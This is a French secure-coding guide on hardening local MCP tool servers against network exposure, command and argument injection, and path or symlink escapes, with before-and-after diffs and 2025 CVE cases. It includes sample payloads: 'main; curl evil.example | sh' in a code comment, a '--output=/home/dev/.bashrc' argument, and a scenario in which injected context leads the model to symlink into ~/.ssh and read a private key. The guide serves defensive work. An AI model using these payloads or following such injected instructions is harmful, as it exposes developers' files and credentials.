## Pourquoi « local » ne veut pas dire « à l'abri »

Un serveur MCP local reçoit ses arguments du modèle. Le modèle les choisit d'après son contexte, que l'attaquant écrit par une issue, un ticket ou une facture importée. Pour la revue de code, un argument d'outil est donc une **entrée non fiable**, au même titre qu'un paramètre de requête HTTP. S'y ajoutent deux aggravations : le processus a les droits du développeur (clés SSH, jetons cloud, dépôts), et s'il écoute en HTTP, le navigateur du développeur peut servir de pont.

Les CVE de 2025 couvrent les trois familles. On les reprend dans l'ordre où elles se présentent quand on écrit un serveur.

## L'exposition réseau : Origin, Host, adresse d'écoute

<Callout kind="case">
**CVE-2025-49596** (CVSS 9,4, publiée le 13 juin 2025) touchait **MCP Inspector**, l'outil officiel de test de serveurs. Son proxy local, sur le port 6277, n'exigeait aucune authentification ; une requête vers `/sse?transportType=stdio&command=…` lui faisait lancer la commande de son choix. Oligo Security a montré qu'une simple page web y parvenait, par la faille de navigateur dite « 0.0.0.0-day », par DNS rebinding ou par CSRF. La version 0.14.1 a ajouté un jeton de session activé par défaut, la validation des en-têtes Origin et Host, et l'écoute limitée à localhost.
</Callout>

La spécification transpose ces trois parades au transport Streamable HTTP : valider `Origin` (403 s'il est présent et invalide), écouter sur 127.0.0.1, authentifier. Le SDK TypeScript v2 les applique par défaut avec `createMcpExpressApp`.

<Diff file="tools/mcp-factures-local/src/server.ts" hlBefore="3,6" hlAfter="1,4,5,8,9">

```ts
import express from 'express';

const app = express();                  // ni Host ni Origin vérifiés
app.use(express.json());
app.all('/mcp', (req, res) => void node(req, res, req.body));
app.listen(3920);                       // écoute sur toutes les interfaces
```

```ts
import { createMcpExpressApp } from '@modelcontextprotocol/express';

// Host et Origin validés : un domaine rebindé vers 127.0.0.1 reçoit 403.
const app = createMcpExpressApp();
app.all('/mcp', requireLocalToken, (req, res) => void node(req, res, req.body));
// Le jeton couvre ce qu'Origin ne voit pas : un autre processus du poste
// n'envoie pas d'Origin, et la documentation du SDK précise qu'une requête sans Origin passe.
app.listen(3920, '127.0.0.1');
```

</Diff>

Le cas qui casse une protection fondée sur Origin seul : un script malveillant installé sur le poste (une dépendance npm compromise, par exemple) appelle `curl http://127.0.0.1:3920/mcp`. Pas de navigateur, donc pas d'Origin, donc aucun refus. D'où le jeton local, ou mieux : rester en **stdio**, que la spécification recommande pour un serveur destiné à tourner sur le poste, parce que seul le processus hôte peut alors l'appeler.

## Les commandes : shell, puis arguments

**CVE-2025-53967** (Framelink Figma MCP, corrigée en 0.6.3) : une entrée contenant des métacaractères shell finissait dans une commande `curl` construite par concaténation. Le correctif évident est de quitter le shell. Il ne suffit pas, comme l'a montré **CVE-2025-68144** dans le serveur git officiel : `git_diff` et `git_checkout` passaient la valeur fournie directement à git, et `--output=/chemin/fichier` était lu comme une option, d'où l'écrasement de fichiers.

<Diff file="tools/mcp-git-novafact/src/tools/diff.ts" hlBefore="2" hlAfter="6,7,8,9,10">

```ts
export async function gitDiff(repo: string, ref: string) {
  return exec(`git -C ${repo} diff ${ref}`);          // ref = "main; curl evil.example | sh"
}
```

```ts
import { execFile as execFileCb } from 'node:child_process';
import { promisify } from 'node:util';
const execFile = promisify(execFileCb);

export async function gitDiff(repo: string, ref: string) {
  // Sans shell, « ; » ne fait plus rien ; mais git lirait encore « --output=… » comme une option.
  if (ref.startsWith('-')) throw new ToolError('référence invalide');
  await execFile('git', ['-C', repo, 'rev-parse', '--verify', '--quiet', `${ref}^{commit}`]);
  return execFile('git', ['-C', repo, 'diff', '--end-of-options', ref], { timeout: 10_000 });
}
```

</Diff>

Le payload qui casse le correctif à moitié fait (`execFile` sans contrôle de la valeur) : `ref = "--output=/home/dev/.bashrc"`. Pas de shell, pas de métacaractère, et pourtant un fichier réécrit. `--end-of-options`, que git comprend depuis la version 2.24, lui dit que ce qui suit n'est plus une option ; la vérification par `rev-parse` garantit en plus que la valeur désigne un commit. Le refus du `-` initial et la vérification de la référence reprennent le correctif officiel ; `--end-of-options` ajoute une seconde barrière.

## Les chemins : préfixe, puis lien symbolique

Le serveur Filesystem officiel a illustré les deux étapes classiques de l'échec, publiées le 1er juillet 2025 et corrigées en 2025.7.1 :

- **CVE-2025-53110** : le contrôle vérifiait que le chemin **commençait par** le dossier autorisé. `/srv/factures-archive` commence par `/srv/factures`.
- **CVE-2025-53109** : une fois le préfixe corrigé, un **lien symbolique** placé dans le dossier autorisé menait ailleurs, la vérification portant sur le chemin écrit et non sur sa cible.

Le serveur git a eu son équivalent (**CVE-2025-68145**) : lancé avec `--repository`, il ne vérifiait pas que les chemins des appels suivants restaient dans ce dépôt.

<Diff file="tools/mcp-factures-local/src/paths.ts" hlBefore="4" hlAfter="1,4,5,6,7,8,9">

```ts
const ROOT = '/srv/factures';

export function resolveInvoicePath(requested: string) {
  if (!path.resolve(requested).startsWith(ROOT)) throw new ToolError('hors périmètre');
  return path.resolve(requested);
}
```

```ts
const ROOT = fs.realpathSync('/srv/factures');      // la racine elle-même peut être un lien

export async function resolveInvoicePath(requested: string) {
  // realpath suit les liens : on compare la cible réelle, pas le chemin écrit.
  const real = await fs.promises.realpath(path.resolve(ROOT, requested));
  const rel = path.relative(ROOT, real);
  // « .. » en tête ou chemin absolu (autre volume) : on est sorti de la racine.
  if (rel === '..' || rel.startsWith('..' + path.sep) || path.isAbsolute(rel)) throw new ToolError('hors périmètre');
  return real;
}
```

</Diff>

Le payload qui casse un correctif limité à `path.resolve` : le modèle, sur consigne, crée `/srv/factures/export` comme lien vers `/home/dev/.ssh` avec un autre outil du même serveur, puis lit `export/id_ed25519`. Le chemin écrit est dans la racine, sa cible non. `realpath` résout la cible ; il reste une fenêtre entre la vérification et l'ouverture, que l'on ferme en n'exposant aucun outil qui crée des liens et en faisant tourner le serveur sous un compte qui n'a de droits que sur ce dossier.
